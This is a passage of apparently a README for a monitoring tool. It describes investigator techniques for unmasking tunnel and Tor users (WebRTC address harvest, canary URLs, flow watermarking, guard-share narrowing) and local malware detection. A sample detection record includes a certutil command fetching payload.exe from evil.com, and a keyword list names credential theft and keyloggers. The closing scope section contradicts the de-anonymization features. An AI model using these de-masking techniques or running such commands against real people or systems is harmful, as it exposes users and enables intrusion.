- **Unmasking operators and buyers at controlled endpoints.** When investigators lawfully control an endpoint the suspect touches — a seized market's login page, an undercover listing, a honeypot drop site — the de-mask suite does the rest: a `/d/<tok>` page whose WebRTC harvest returns the pre-tunnel address on a leaking client, a canary URL that reports the fetcher's real egress, an ETag session link that joins the same fingerprint across different exits, and a DNS authority (`--demask-dns`) that captures the suspect's real resolver path including EDNS client-subnet.
- **Correlating flows across the tunnel.** Tunnels hide payloads, not packet *shape*. Responses served to a suspect carry an injected pacing watermark; the sniffer continuously scores every observed flow against it, and `POST /f/<tok>` accepts observations from a cooperating vantage (an ISP's NetFlow under legal process, a second sensor). A ≥0.72 match joins the entry side and exit side — the technique published as flow watermarking / DeepCorr, run as a feature.
- **Narrowing a suspect inside the Tor user population.** `tor_guard_census()` computes each guard's share of the ~2M-user client population from consensus weights; knowing a suspect's guard preference narrows them to that share. Investigators running their own relays (`our_tor_relays[]`, verified against Onionoo) gain the entry-side view directly; a local relay's inbound OR-port clients are listed by `_tor_relay_observe()`.
- **The lawful floor, built in.** Where the wire genuinely cannot produce the answer — a disciplined suspect who never touches a controlled endpoint — the report says so per channel and pivots to the one record that always exists: the operator's connection logs, reached through the drafted records request. And the channels it refuses to implement (server compromise, client compromise, protocol subversion) appear in every report as `BLOCKED` with the lawful substitute named — the tool is built for the evidence chain, not around it.


## How Evidence Works

Every deduction is a `Deduction` dataclass with:

- **category** — one of 40+ named categories (MIMIC, FOREIGN, BEACON, LOLBIN_ABUSE, etc.)
- **severity** — CRITICAL or WARNING
- **process_name** and **pid** — the offending process
- **message** — human-readable summary
- **evidence** — a list of strings, each one a specific fact that contributed to the deduction
- **score** — numeric risk score (0-100+, compounded by `AlertEscalation` when the same process triggers multiple deductions within 5 minutes)

For example, a `LOLBIN_ABUSE` deduction might have evidence like:

```
["Process: certutil.exe (PID 4892)",
 "Command: certutil -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\run.exe",
 "Matched pattern: -urlcache",
 "Matched pattern: -split",
 "Matched pattern: http"]
```

This is auditable. You can see exactly what the process was doing and why the monitor flagged it. You can verify whether it was a legitimate admin task or an attack.

## The Anti-Hack Pin System

When an anti-hack check fires, the finding is "pinned" to the remote IP addresses owned by the offending process. This connects the local detection to the network endpoint:

- `_pin_to_conns(pid, category, detail)` — finds all remote IPs for the PID and adds the category to `_anti_hack_pins[ip]`
- `_anti_hack_pins` — dict mapping `ip → set(categories)`
- `_anti_hack_details` — dict mapping `ip → list(detail_strings)`

Pins are rendered in the Overview tab, Live Connections tab, All Connections tab, and per-connection detail views. They are also exported in the **Sneakiest Connections** section of save files.

## Auto-Flag Action System

Beyond the 16 core deductions and 18 anti-hack checks, every process action is screened against 33 suspicious keyword patterns. This catches activity that does not match a specific deduction rule but still warrants attention:

- `cookie` → COOKIE_TRACKING
- `upload`/`exfil` → DATA_UPLOAD / DATA_EXFIL
- `credential`/`password`/`token` → CREDENTIAL_ACCESS / TOKEN_ACCESS
- `clipboard` → CLIPBOARD_ACCESS
- `keylog` → KEYLOGGER
- `screenshot` → SCREEN_CAPTURE
- `inject`/`hook` → CODE_INJECTION / API_HOOK
- `encrypt`/`decrypt` → ENCRYPTION (possible ransomware)
- `powershell`/`cmd.exe`/`wscript`/`cscript` → SCRIPT_EXEC
- `rdp`/`vnc`/`ssh`/`telnet` → REMOTE_ACCESS
- `microphone`/`camera`/`webcam`/`audiodg` → HARDWARE_ACCESS
- `temp\`/`appdata`/`downloads\` → TEMP_EXECUTION / SUSPICIOUS_PATH

These appear in the Suspicious Activity tab and the save file's Suspicious Activity section.

## Known Service Validation

The monitor includes CIDR ranges for known services (Google, Cloudflare, Microsoft, Discord, Zoom, Riot Games) and expected executable paths for 20+ system and application processes. This allows it to:

- Validate that a `chrome.exe` connection to a Google IP range is legitimate
- Flag a `chrome.exe` connection to an unknown IP as suspicious
- Detect a `svchost.exe` running from `C:\Temp\` as process hollowing
- Detect a `svchost.exe` spawned by `cmd.exe` as parent spoofing

## Scope

This program is for **local defensive security monitoring**. It helps you:

- Detect if a hacker has gained access to your machine
- Detect if malware is running, even fileless malware using LOLbins
- Detect if your VPN is leaking your real IP or DNS queries
- Detect if a process is beaconing to a C2 server
- Detect if someone is dumping credentials or moving laterally
- Detect if persistence mechanisms have been installed
- Record everything in time-segmented files for forensic analysis — organized `sessions/YYYY-MM-DD/` logs plus a dedicated `Desktop/GNAT/YYYY-MM-DD/` record folder with a `RECORD MANIFEST` section and a `latest_snapshot.json` machine-readable twin of the full session payload

It is not for de-anonymizing remote VPN users, attacking remote systems, or replacing your antivirus. It is a witness that watches your own machine and tells you what it sees.
